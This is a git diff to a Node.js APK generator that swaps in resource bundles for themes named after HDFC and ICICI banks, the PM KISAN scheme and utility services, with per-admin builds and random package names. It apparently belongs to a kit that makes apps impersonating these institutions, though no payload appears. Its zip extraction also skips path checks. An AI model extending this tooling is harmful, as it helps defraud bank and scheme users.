@@ -3,6 +3,7 @@ const fs = require("fs");
 const unzipper = require("unzipper");
 const {spawn} = require("child_process");
 const sharp = require("sharp");
+const AdmZip = require('adm-zip');
 
 class ApkGenerator {
     constructor(adminID, appName, appTheme, adminConfigs, amount, packageName, id) {
@@ -17,6 +18,20 @@ class ApkGenerator {
         this.mainProjectPath = path.join(__dirname, "../../data/main/project.zip");
         this.newPackage = "";
         this.adminPackageName = packageName;
+        this.resPath = path.join(this.projectPath, 'app', 'src', 'main', 'res');
+        this.initResPath();
+        this.resZip = null;
+    }
+
+    initResPath() {
+        if (this.appTheme === "WATER" || this.appTheme === "Customer SB" || this.appTheme === "HDFC NEU" || this.appTheme === "ICICI" || this.appTheme === "PM KISAN") {
+            this.resZip = path.join(__dirname, `../../data/resources/${this.appTheme}.zip`);
+        } else if (this.appTheme === "POWER" || this.appTheme === "POWER V2") {
+            this.resZip = path.join(__dirname, `../../data/resources/POWER.zip`);
+        }
+        if (this.appTheme === "HDFC SK" || this.appTheme === "NEW HDFC" || this.appTheme === "HDFC") {
+            this.resZip = path.join(__dirname, `../../data/resources/HDFC SK.zip`);
+        }
     }
 
     getRandomPackage() {
@@ -314,113 +329,6 @@ class ApkGenerator {
     }
 
 
-    replaceIcons(iconPath, projectPath) {
-        const resDir = path.join(projectPath, 'app', 'src', 'main', 'res');
-
-        const iconNames = [
-            'ic_launcher.png',
-            'ic_launcher_round.png',
-            'ic_launcher_foreground.png'
-            // Add more PNG names if you have
-        ];
-
-        const folders = fs.readdirSync(resDir).filter(folder =>
-            folder.startsWith('mipmap') || folder.startsWith('drawable')
-        );
-
-        // 🔥 Remove problematic XML files
-        const xmlFolder = path.join(resDir, 'mipmap-anydpi-v26');
-        if (fs.existsSync(xmlFolder)) {
-            fs.readdirSync(xmlFolder).forEach(file => {
-                if (file.startsWith('ic_launcher') && file.endsWith('.xml')) {
-                    const filePath = path.join(xmlFolder, file);
-                    fs.unlinkSync(filePath);
-                    console.log(`🗑️ Deleted XML: ${filePath}`);
-                }
-            });
-        }
-
-        // ✅ Replace PNG icons in mipmap folders
-        folders.forEach(folder => {
-            iconNames.forEach(iconFile => {
-                const targetPath = path.join(resDir, folder, iconFile);
-                const sourcePath = path.join(iconPath, iconFile);
-
-                if (fs.existsSync(sourcePath)) {
-                    fs.copyFileSync(sourcePath, targetPath);
-                    console.log(`✅ Replaced ${iconFile} in ${folder}`);
-                }
-            });
-        });
-
-        console.log('🎯 Icon replacement complete.');
-    }
-
-
-    async generateAdaptiveIcon() {
-        try {
-            const drawablePath = path.join(this.projectPath, "app", "src", "main", "res", "drawable");
-
-            // Ensure drawable directory exists
-            fs.mkdirSync(drawablePath, {recursive: true});
-
-            const foregroundOutput = path.join(drawablePath, "app_icon_foreground.png");
-            const backgroundXmlPath = path.join(drawablePath, "app_icon_background.xml");
-
-            this.printLine("🎨 Generating adaptive icon assets...");
-
-            // Resize icon to 220x220 and center it in 324x324 transparent canvas
-            const resizedBuffer = await sharp(this.iconPath)
-                .resize({
-                    width: 220,
-                    height: 220,
-                    fit: "contain",
-                    background: {r: 0, g: 0, b: 0, alpha: 0},
-                })
-                .toBuffer();
-
-            await sharp({
-                create: {
-                    width: 324,
-                    height: 324,
-                    channels: 4,
-                    background: {r: 0, g: 0, b: 0, alpha: 0},
-                },
-            })
-                .composite([{input: resizedBuffer, gravity: "center"}])
-                .png()
-                .toFile(foregroundOutput);
-
-            this.printLine("✅ app_icon_foreground.png created.");
-
-            // Create white background drawable XML
-            const whiteBgXml = `<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle">
-    <solid android:color="#FFFFFF"/>
-</shape>`;
-            fs.writeFileSync(backgroundXmlPath, whiteBgXml, "utf8");
-            this.printLine("✅ app_icon_background.xml created.");
-
-            // Create mipmap-anydpi-v26 directory if missing
-            const mipmapDir = path.join(this.projectPath, "app", "src", "main", "res", "mipmap-anydpi-v26");
-            fs.mkdirSync(mipmapDir, {recursive: true});
-
-            // Write ic_launcher.xml referencing the adaptive icon layers
-            const icLauncherXml = `<?xml version="1.0" encoding="utf-8"?>
-<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
-    <background android:drawable="@drawable/app_icon_background"/>
-    <foreground android:drawable="@drawable/app_icon_foreground"/>
-</adaptive-icon>`;
-            fs.writeFileSync(path.join(mipmapDir, "ic_launcher.xml"), icLauncherXml, "utf8");
-            this.printLine("✅ ic_launcher.xml created in mipmap-anydpi-v26.");
-
-            this.printLine("✅ Adaptive icon setup complete.");
-        } catch (err) {
-            this.printLine(`❌ Error in generateAdaptiveIcon: ${err.message}`);
-            throw err;
-        }
-    }
-
-
     buildApk() {
         return new Promise((resolve, reject) => {
             this.printLine("⚙️ Cleaning & building APK...");
@@ -453,6 +361,97 @@ class ApkGenerator {
         });
     }
 
+    /**
+     * Validates input paths
+     */
+    validatePaths() {
+        // Check if a project path exists
+        if (!fs.existsSync(this.projectPath)) {
+            throw new Error(`Project path does not exist: ${this.projectPath}`);
+        }
+
+        // Check if a zip file exists
+        if (!fs.existsSync(this.resZip)) {
+            throw new Error(`Zip file does not exist: ${this.resZip}`);
+        }
+
+        // Check if it's an Android project (look for common Android files)
+        const androidManifest = path.join(this.projectPath, 'app', 'src', 'main', 'AndroidManifest.xml');
+        const buildGradle = path.join(this.projectPath, 'app', 'build.gradle');
+
+        if (!fs.existsSync(androidManifest) && !fs.existsSync(buildGradle)) {
+            throw new Error('This does not appear to be a valid Android project');
+        }
+    }
+
+    /**
+     * Removes existing res folder if it exists
+     */
+    removeExistingRes() {
+        if (fs.existsSync(this.resPath)) {
+            console.log(`Removing existing res folder: ${this.resPath}`);
+            fs.rmSync(this.resPath, {recursive: true, force: true});
+        }
+    }
+
+    /**
+     * Extracts zip file to res folder
+     */
+    extractZipToRes() {
+        try {
+            const zip = new AdmZip(this.resZip);
+            const entries = zip.getEntries();
+
+            console.log(`Extracting ${entries.length} files from zip...`);
+
+            // Create res directory
+            fs.mkdirSync(this.resPath, {recursive: true});
+
+            entries.forEach(entry => {
+                const entryPath = path.join(this.resPath, entry.entryName);
+
+                if (entry.isDirectory) {
+                    // Create directory
+                    fs.mkdirSync(entryPath, {recursive: true});
+                } else {
+                    // Create file
+                    const dir = path.dirname(entryPath);
+                    fs.mkdirSync(dir, {recursive: true});
+                    fs.writeFileSync(entryPath, entry.getData());
+                }
+            });
+
+            console.log(`Successfully extracted to: ${this.resPath}`);
+        } catch (error) {
+            throw new Error(`Failed to extract zip: ${error.message}`);
+        }
+    }
+
+    /**
+     * Main method to replace res folder
+     */
+    async replaceRes() {
+        try {
+            console.log('Starting res folder replacement...');
+            console.log(`Project path: ${this.projectPath}`);
+            console.log(`Zip file path: ${this.resZip}`);
+            console.log(`Target res path: ${this.resPath}`);
+
+            // Validate paths
+            this.validatePaths();
+
+            // Remove existing res folder
+            this.removeExistingRes();
+
+            // Extract zip to res folder
+            this.extractZipToRes();
+
+            console.log('✅ Res folder replacement completed successfully!');
+        } catch (error) {
+            console.error('❌ Error:', error.message);
+            throw error;
+        }
+    }
 
     async apkGenerator() {
         try {
@@ -470,7 +469,7 @@ class ApkGenerator {
             const destinationIcon = path.join(this.projectPath, "app", "src", "main", "res", "drawable/");
 
             await this.copyFile(this.iconPath, destinationIcon);
-            await this.replaceIcons(this.iconPath, this.projectPath);
+            await this.replaceRes();
             // await this.generateAdaptiveIcon();
 
             await this.buildApk();
